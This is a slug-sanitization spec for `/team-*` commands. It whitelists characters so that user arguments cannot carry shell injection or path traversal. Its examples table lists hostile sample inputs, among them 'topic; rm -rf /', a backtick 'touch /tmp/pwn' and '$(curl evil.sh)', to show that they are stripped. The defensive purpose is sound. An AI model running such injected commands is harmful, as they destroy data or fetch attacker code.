# Slug Sanitization Rule

Applied by all `/team-*` commands when deriving `<slug>` from `$ARGUMENTS`.

## Algorithm

1. **Lowercase** entire input.
2. **Strip diacritics** (Latin-extended → ASCII): `ế` → `e`, `ñ` → `n`, `ü` → `u`, etc.
3. **Replace** spaces, `_`, and whitespace with `-`.
4. **Whitelist**: remove ALL chars not matching `[a-z0-9-]`. This drops shell metacharacters (`;`, backtick, `$`, `/`, `..`), Unicode chars (CJK, Arabic, Thai, emoji), punctuation.
5. **Collapse** consecutive `-` into single `-`.
6. **Trim** leading and trailing `-`.
7. **Truncate** to 50 characters max. If truncation mid-word, trim to last `-` before limit.
8. **Validate:** if result is empty OR all-digits → AskUserQuestion: "Provide manual kebab-case slug (a-z, 0-9, -)" with PO text input.

## Examples

| Input | Output |
|-------|--------|
| "Habit Tracker" | `habit-tracker` |
| "theo dõi thói quen" | `theo-doi-thoi-quen` |
| "mixed 混合双语 portfolio" | `mixed-portfolio` |
| "中文项目" | (empty → AskUserQuestion) |
| "topic; rm -rf /" | `topic-rm-rf` (semicolons/slashes stripped) |
| "\`touch /tmp/pwn\`" | `touch-tmppwn` |
| "$(curl evil.sh)" | `curl-evilsh` |
| Empty | (empty → AskUserQuestion) |
| 80-char string | truncated to 50 at last `-` |

## Security note

The whitelist approach ensures NO shell metacharacters, path traversal, or Unicode chars propagate downstream. Commands MUST NOT re-introduce raw `$ARGUMENTS` into shell invocations.
